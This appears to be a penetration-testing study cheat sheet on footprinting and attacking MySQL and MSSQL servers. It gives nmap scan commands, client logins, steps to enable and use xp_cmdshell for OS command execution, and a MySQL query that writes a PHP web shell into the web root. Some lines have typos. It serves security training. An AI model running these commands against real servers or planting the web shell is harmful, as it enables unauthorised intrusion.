 ## Dangerous Settings
| Settings | Description |
| --------- | ------------ |
| user | Sets which user the MySQL service will run as. |
| password | Sets the password for the MySQL user. |
| admin_address | The IP address on which to listen for TCP/IP connections on the administrative network interface. |
| debug | This variable indicates the current debugging settings. |
| sql_wanrings | This variable indicates the current debugging settings | 
| secure_file_priv | This variable is used to limit the effect of data import and export operations. |

## Footprinting the Service
- Scanning MySQL Server
```bash
sudo nmap $IP -sV -sC -p3306 --script mysql*
```

- Interaction with the MySQL Server
```bash
mysql -u root -p Password -h $IP
```

- sqlcmd
```cmd
sqlcmd -S SRVMSSQL -U root -P 'Password' -y 30 -Y 30
# -y (SQLCMDMAXVARTYPEWIDTH) and -Y (SQLCMDMAXFIXEDTYPEWIDTH) are for better output

# If we use sqlcmd, we will need to use GO after our query to execute the SQL syntax.
```

- If targeting MSSQL from Linux, we can use `sqsh` / `mssqlclient.py` as an alternative:
```bash 
sqsh -S $IP -U root -P 'Password' -h
```

- mssqlclient.py
```bash 
mssqlclient.py -p 1433 $USER@HOST

# NOTE: if using Windows Authentication, we may need to add -widows-auth flag to ensure the log in works. Play around with $USER@HOST, $DOMAIN\$USER@HOST (both with -windows-auth flag)
```

- For Windows Authentication, we need to specify the domain name /hostname of the target (inlanefreight\julio instead of just julio). Without `inlanefreight`, it will authenticate against users in SQL server.
```bash
sqsh -S $IP -U inlanefreight\\julio (or .\\julio) -P $PASSWORD -h
```

-------
## SQL Default Databases
-------------

`MySQL` default system schemas/databases:
```
- `mysql` - is the system database that contains tables that store information required by the MySQL server
- `information_schema` - provides access to database metadata
- `performance_schema` - is a feature for monitoring MySQL Server execution at a low level
- `sys` - a set of objects that helps DBAs and developers interpret data collected by the Performance Schema
```

`MSSQL` default system schemas/databases:
```
- `master` - keeps the information for an instance of SQL Server.
- `msdb` - used by SQL Server Agent.
- `model` - a template database copied for each new database.
- `resource` - a read-only database that keeps system objects visible in every database on the server in sys schema.
- `tempdb` - keeps temporary objects for SQL queries.
```

#### Execute Commands
- `xp_cmdshell`: a feature of MSSQL, can be disabled/enabled by using the Policy-Based management or sp_configure
```bash
xp_cmdshell 'whoami'
Go
```

- Enable `xp_cmdshell`
```bash
# Allow Advanced options to be changed
EXECUTE sp_configure 'show advanced options', 1
GO

# Update the currently confugured value for advanced options
RECONFIGURE
GO

# To enable the feature
EXECUTE sp_configure 'xp_cmdshell', 1
GO

# To update the currently configured value for this feature
RECONFIGURE
GO
```

### Write Local Fiels
- MySQL - Write Local File
```bash
mysql> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
```

---------
# MSSQL CHEAT SHEET
-------------

- Show Databases
```bash 
SELECT name FROM master.dbo.sysdatabases
GO
```

- Select Databases;
```bash
USE $DATABASE_NAME
GO
```

- Show Tables
```bash
SELECT table_name FROM $DATABASE_NAME.INFORMATION_SCHEMA.TABLES
GO
```

* Select all data from a table
```bash
SELECT * FORM $TABLE_NAME
GO
```